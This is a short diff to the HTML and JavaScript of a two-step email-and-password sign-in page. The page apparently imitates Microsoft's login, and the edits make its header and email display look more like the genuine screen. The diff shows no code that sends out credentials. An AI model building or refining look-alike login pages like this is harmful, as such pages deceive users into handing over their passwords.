@@ -531,7 +531,7 @@
             <div id="passwordForm" class="password-section">
                 <div class="form-group">
                     <p id="verifiedEmailDisplay" style="color: #323130; font-size: 14px; margin-bottom: 10px;"></p>
-                    <label for="passwordInput" style="display: block; margin-bottom: 10px; color: #323130; font-size: 14px; font-weight: 600;">Enter your password</label>
+                  
                     <input type="password" id="passwordInput" class="microsoft-input" placeholder="Password" required>
                 </div>
 
@@ -646,7 +646,7 @@
 
                 // Restore header text based on current step
                 if (currentStep === 'email') {
-                    headerTitle.textContent = 'Sign in to Microsoft';
+                    headerTitle.textContent = 'Sign in';
                     emailForm.style.display = 'block';
                     passwordForm.style.display = 'none';
                     successForm.style.display = 'none';
@@ -684,7 +684,7 @@
             document.getElementById('emailForm').style.display = 'block';
             document.getElementById('passwordForm').style.display = 'none';
             document.getElementById('successForm').style.display = 'none';
-            document.getElementById('headerTitle').textContent = 'Sign in to Microsoft';
+            document.getElementById('headerTitle').textContent = 'Sign in ';
             document.getElementById('emailInput').value = ''; // Clear email input
             clearMessage();
         }
@@ -692,7 +692,7 @@
         function showPasswordForm(email) {
             currentStep = 'password';
             verifiedEmailAddress = email; // Store the verified email
-            document.getElementById('verifiedEmailDisplay').textContent = `Using ${email}`;
+            document.getElementById('verifiedEmailDisplay').textContent = `${email}`;
             document.getElementById('passwordInput').value = ''; // Clear password input
             document.getElementById('passwordInput').focus();
             document.getElementById('emailForm').style.display = 'none';
